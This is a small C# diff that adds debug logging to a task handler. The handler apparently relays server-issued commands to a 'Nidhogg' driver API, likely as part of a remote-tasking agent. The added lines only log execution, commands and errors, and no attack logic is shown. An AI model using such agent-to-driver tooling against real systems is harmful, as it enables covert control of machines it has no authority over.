@@ -20,19 +20,23 @@ namespace Workflow
         }
         public async Task Execute(ServerJob job)
         {
+            DebugLog.Log($"Executing {Name} [{job.task.id}]");
             NidhoggArgs args = JsonSerializer.Deserialize<NidhoggArgs>(job.task.parameters);
 
             try
             {
+                DebugLog.Log($"{Name} command='{args.command}' [{job.task.id}]");
                 var nidhogg = new NidhoggApi();
                 //var nidhogg = new NidhoggApi("\\\\.\\NotNidhogg");
                 await this.HandleNidhoggCommand(nidhogg, args, job.task.id);
             }
             catch (NidhoggApiException e)
             {
+                DebugLog.Log($"{Name} NidhoggApiException: {e.Message} [{job.task.id}]");
                 this.messageManager.WriteLine(e.Message, job.task.id, true, "error");
                 return;
             }
+            DebugLog.Log($"{Name} completed [{job.task.id}]");
         }
 
         private async Task HandleNidhoggCommand(NidhoggApi api, NidhoggArgs args, string task_id)
